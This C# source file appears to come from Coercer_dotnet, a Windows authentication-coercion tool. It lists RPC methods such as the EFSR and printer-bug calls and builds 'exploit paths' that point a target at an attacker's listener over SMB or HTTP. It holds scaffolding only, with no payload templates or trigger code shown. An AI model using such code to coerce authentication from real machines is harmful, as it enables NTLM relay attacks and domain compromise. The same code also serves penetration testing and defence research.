using System.Text.RegularExpressions;
using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods
{
    public class AvailableMethods
    {
        public Method[] Methods { get; }

        public AvailableMethods()
        {
            Methods = new Method[]
            {
                new MS_DFSNM.NetrDfsAddStdRoot(),
                new MS_DFSNM.NetrDfsRemoveStdRoot(),
                new MS_EFSR.EfsRpcAddUsersToFile(),
                new MS_EFSR.EfsRpcAddUsersToFileEx(),
                new MS_EFSR.EfsRpcDecryptFileSrv(),
                new MS_EFSR.EfsRpcDuplicateEncryptionInfoFile(),
                new MS_EFSR.EfsRpcEncryptFileSrv(),
                new MS_EFSR.EfsRpcFileKeyInfo(),
                new MS_EFSR.EfsRpcOpenFileRaw(),
                new MS_EFSR.EfsRpcQueryRecoveryAgents(),
                new MS_EFSR.EfsRpcQueryUsersOnFile(),
                new MS_EFSR.EfsRpcRemoveUsersFromFile(),
                new MS_EVEN.ElfrOpenBELW(),
                new MS_FSRVP.IsPathShadowCopied(),
                new MS_FSRVP.IsPathSupported(),
                new MS_RPRN.RpcRemoteFindFirstPrinterChangeNotification(),
                new MS_RPRN.RpcRemoteFindFirstPrinterChangeNotificationEx()
            };
        }
    }

    public abstract class Method
    {
        public abstract string Description { get; }
        public abstract string Author { get; }
        public abstract ExploitPath[] ExploitPaths { get; }
        public abstract NcanNpAccess[] NcanNpAccesses { get; }
        public abstract NcacnIpTcpAccess[] NcacnIpTcpAccesses { get; }
        public abstract Protocol Protocol { get; }
        public abstract Function Function { get; }

        // public abstract void Trigger();
    }

    public class Access
    {
        public string Uuid { get; }
        public string Version { get; }

        public Access(string uuid, string version)
        {
            Uuid = uuid;
            Version = version;
        }
    }

    public class NcanNpAccess : Access
    {
        public string NamedPipe { get; }

        public NcanNpAccess(string namedPipe, string uuid, string version) : base(uuid, version)
        {
            NamedPipe = namedPipe;
        }
    }

    public class NcacnIpTcpAccess : Access
    {
        public NcacnIpTcpAccess(string uuid, string version) : base(uuid, version) { }
    }

    public class Protocol
    {
        public string Name { get; }
        public string ShortName { get; }

        public Protocol(string name, string shortName)
        {
            Name = name;
            ShortName = shortName;
        }
    }

    public class Function
    {
        public string Name { get; }
        public int Opnum { get; }
        public string[] VulnerableArguments { get; }

        public Function(string name, int opnum, string[] vulnerableArguments)
        {
            Name = name;
            Opnum = opnum;
            VulnerableArguments = vulnerableArguments;
        }
    }

    public class ExploitPath
    {
        private static readonly string regexPattern = @"\{\{(\d+)\}\}";
        private static readonly string randomStringAvailableChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        private static readonly Random random = new();
        public AuthType AuthType { get; }
        public string Template { get; }

        public ExploitPath(AuthType authType, string template)
        {
            AuthType = authType;
            Template = template;
        }

        public string Generate(string listener, int port)
        {
            string exploitPath = Template;
            exploitPath = exploitPath.Replace("{{listener}}", listener);
            exploitPath = exploitPath.Replace("{{port}}", "@" + port.ToString());

            exploitPath = Regex.Replace(exploitPath, regexPattern, match =>
            {
                int randomStringLength = int.Parse(match.Groups[1].Value);
                char[] randomStringChars = new char[randomStringLength];
                for (int i = 0; i < randomStringLength; i++)
                {
                    randomStringChars[i] = randomStringAvailableChars[random.Next(randomStringAvailableChars.Length)];
                }
                return new string(randomStringChars);
            });

            return exploitPath;
        }

        public string Generate(string listener)
        {
            if (AuthType == AuthType.NONE)
            {
                throw new Exception("Auth Type cannot be none.");
            }
            return Generate(listener, AuthType == AuthType.SMB ? 445 : 80);
        }
    }
}